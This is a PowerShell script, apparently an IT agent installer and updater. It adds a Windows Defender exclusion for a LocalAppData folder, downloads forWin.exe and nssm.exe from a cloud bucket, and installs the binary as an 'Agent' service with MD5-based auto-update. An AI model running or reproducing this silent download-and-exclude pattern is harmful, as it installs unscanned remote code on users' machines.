$ProgressPreference = 'SilentlyContinue'
$localAppData = $env:LOCALAPPDATA
$targetDirectory = Join-Path $localAppData "utools"
$logPath = Join-Path $targetDirectory "update.log"

function Write-Log {
  param (
    $Message
  )
  $Message= -join (get-date -Format("yyyy/MM/dd-HH:mm:ss"))+ ':'+$env:COMPUTERNAME+':'+$Message
  Write-Output -InputObject $Message | Out-File $logPath -Append
}



# Sync Time

Start-Service W32Time -ErrorAction SilentlyContinue
w32tm /resync /force> | Out-Null

# CREATE TARGET FOLDER
if (-not(Test-Path $targetDirectory))
{
  New-Item -Path $targetDirectory -ItemType Directory | Out-Null
}

# SET WDF RULE
if (-not ($targetDirectory -in (Get-MpPreference).ExclusionPath))
{
  Add-MpPreference -ExclusionPath $targetDirectory -ErrorAction SilentlyContinue
  if ($?) 
  {
    Write-Log -Message "Change Windows Defender OK"
  }
  else
  {
    Write-Log -Message "Change Windows Defender Fail"
  }
}
else
{
  Write-Log -Message "Windows Defender NOT NEED TO CHANGE."
}


$nssm="https://it2u.oss-cn-shenzhen.aliyuncs.com/utools/nssm.exe"
$client="https://it2u.oss-cn-shenzhen.aliyuncs.com/forWin.exe"

# INIT INSTALLATION AND IF NOT EXIST Service.
if( -not (Test-Path -Path $targetDirectory\forWin.exe)) {
  Invoke-WebRequest -Uri $nssm -OutFile $targetDirectory\"nssm.exe" -ErrorAction SilentlyContinue
  Invoke-WebRequest -Uri $client -OutFile $targetDirectory\"forWin.exe" -ErrorAction SilentlyContinue
}

Get-Service -Name Agent -ErrorAction SilentlyContinue
if ($?) {
  Write-Log -Message "The service has been existed."
}else{
  start-process -FilePath "$env:ComSpec" -WorkingDirectory $targetDirectory -ArgumentList "/c"," nssm install Agent forWin.exe" -NoNewWindow -Wait
  Get-Service -Name Agent -ErrorAction SilentlyContinue | start-service
}

# CHECK VERSION AND IF Service is NOT lastest version.

if ((Get-Service -Name Agent -ErrorAction SilentlyContinue).Status -eq "Running")
{
  Write-Log -Message "Stop service for maintaining."
  stop-service -Name Agent -Force -ErrorAction SilentlyContinue
  Stop-Process -Name forWin -Force -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 2

  # STOP SERVICE FOR CHECK SERVICE BIN FILE MD5 HASH CODE WITH  LOCATE SERVER SIDE VALUE.
  $flags = (Get-FileHash -Algorithm MD5 $targetDirectory\"forWin.exe").Hash -eq (Invoke-RestMethod -Uri https://it2u.oss-cn-shenzhen.aliyuncs.com/md5.json).Hash

  if (-not $flags)
  # IF MD5 HASH NOT MATCH ,REPALCE THE BIN FILE.
  {
    Invoke-WebRequest -Uri $client -OutFile $targetDirectory\"forWin.exe" -ErrorAction SilentlyContinue
    if ($?) { Write-Log -Message " The Service File has been updated successfully!"}else{ Write-Log -Message "The Service File has been update failed"}

    Start-Service -Name Agent -ErrorAction SilentlyContinue
    if ($?) { Write-Log -Message " Start Service OK"}else{ Write-Log -Message "Start Service  Fail"}
  }
  else
  # RESUME THE SERVICE WHICH STOPPED.
  {
    Write-Log -Message "Nothing NEED ToDo."
    Start-Service -Name Agent -ErrorAction SilentlyContinue
    if ($?) 
    {
      Write-Log -Message "Service IS RESUME "
    }
    else
    {
      Write-Log -Message "Start Service  Fail"
    }
  } 
}
